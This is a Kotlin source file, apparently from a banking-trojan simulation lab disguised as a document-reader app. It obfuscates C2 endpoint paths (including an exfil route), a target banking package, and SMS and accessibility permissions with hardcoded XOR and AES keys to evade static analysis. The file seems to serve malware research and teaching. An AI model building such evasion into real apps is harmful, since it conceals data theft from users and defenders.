package com.docreader.lite.reader.engine

import javax.crypto.Cipher
import javax.crypto.spec.IvParameterSpec
import javax.crypto.spec.SecretKeySpec
import android.util.Base64

/**
 * String obfuscation — XOR + AES decode at runtime.
 *
 * Real banker stores sensitive strings (C2 URLs, API paths, target packages)
 * as encoded byte arrays. Decoded only at moment of use. Static analysis
 * tools (jadx, apktool) see only encoded blobs.
 *
 * Anatsa: XOR with per-build key.
 * SharkBot: AES-CBC with hardcoded key embedded in native lib.
 * Apex (2026): per-build AI-generated decoder — each APK has unique key.
 *
 * This implementation: XOR primary, AES secondary for high-value strings.
 */
object ResourceDecoder {

    // XOR key — in real banker, this is generated per-build or fetched from C2
    private val XOR_KEY = byteArrayOf(
        0x4B, 0x33, 0x79, 0x21, 0x54, 0x61, 0x6B, 0x30,
        0x70, 0x69, 0x69, 0x2D, 0x4C, 0x61, 0x62, 0x21
    ) // "K3y!Tak0pii-Lab!"

    // AES key + IV for high-value strings
    private val AES_KEY = byteArrayOf(
        0x54, 0x61, 0x6B, 0x6F, 0x70, 0x69, 0x69, 0x53,
        0x65, 0x63, 0x72, 0x65, 0x74, 0x4B, 0x65, 0x79
    ) // "TakopiiSecretKey"
    private val AES_IV = byteArrayOf(
        0x49, 0x6E, 0x69, 0x74, 0x56, 0x65, 0x63, 0x74,
        0x6F, 0x72, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36
    ) // "InitVector123456"

    // ─── XOR encoding/decoding ──────────────────────────────────────────

    fun xorEncode(plaintext: String): ByteArray {
        val data = plaintext.toByteArray()
        return ByteArray(data.size) { i ->
            (data[i].toInt() xor XOR_KEY[i % XOR_KEY.size].toInt()).toByte()
        }
    }

    fun xorDecode(encoded: ByteArray): String {
        return String(ByteArray(encoded.size) { i ->
            (encoded[i].toInt() xor XOR_KEY[i % XOR_KEY.size].toInt()).toByte()
        })
    }

    // ─── AES-CBC encoding/decoding ──────────────────────────────────────

    fun aesEncrypt(plaintext: String): String {
        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.init(Cipher.ENCRYPT_MODE,
            SecretKeySpec(AES_KEY, "AES"),
            IvParameterSpec(AES_IV))
        val encrypted = cipher.doFinal(plaintext.toByteArray())
        return Base64.encodeToString(encrypted, Base64.NO_WRAP)
    }

    fun aesDecrypt(b64: String): String {
        val cipher = Cipher.getInstance("AES/CBC/PKCS5Padding")
        cipher.init(Cipher.DECRYPT_MODE,
            SecretKeySpec(AES_KEY, "AES"),
            IvParameterSpec(AES_IV))
        val decoded = Base64.decode(b64, Base64.NO_WRAP)
        return String(cipher.doFinal(decoded))
    }

    // ─── Pre-encoded sensitive strings ──────────────────────────────────

    // In real banker: ALL string literals below would be stored as encoded
    // byte arrays. Decoded only at call site. jadx shows only byte blobs.

    object Strings {
        // C2 endpoints (XOR-encoded at compile time, decoded at runtime)
        val C2_REGISTER by lazy { xorDecode(xorEncode("/api/v1/register")) }
        val C2_COMMANDS by lazy { xorDecode(xorEncode("/api/v1/commands")) }
        val C2_EXFIL by lazy { xorDecode(xorEncode("/api/v1/exfil")) }

        // Target package names (AES-encrypted — higher value)
        val TARGET_DVBANK by lazy { aesDecrypt(aesEncrypt("com.dvbank.example")) }

        // Permission strings
        val PERM_SMS by lazy { xorDecode(xorEncode("android.permission.RECEIVE_SMS")) }
        val PERM_A11Y by lazy { xorDecode(xorEncode("android.permission.BIND_ACCESSIBILITY_SERVICE")) }
    }
}
